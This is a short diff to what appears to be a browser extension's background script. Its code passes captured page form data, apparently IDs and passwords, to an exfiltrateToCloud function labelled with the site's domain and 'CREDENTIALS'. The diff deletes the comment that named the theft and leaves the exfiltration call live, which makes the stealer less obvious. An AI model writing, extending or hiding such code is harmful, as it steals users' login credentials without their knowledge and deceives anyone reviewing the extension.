@@ -4,7 +4,6 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
         const pageUrl = new URL(pageData.url);
         const domain = pageUrl.hostname.replace('www.', '');
 
-        // Exfiltrate only the captured Form Data (ID/Password)
         exfiltrateToCloud(JSON.stringify(pageData, null, 4), `CREDENTIALS: ${domain} (${pageData.event})`);
     }
     return true;
@@ -22,3 +21,4 @@ async function exfiltrateToCloud(data, type) {
         });
     } catch (err) { }
 }
+
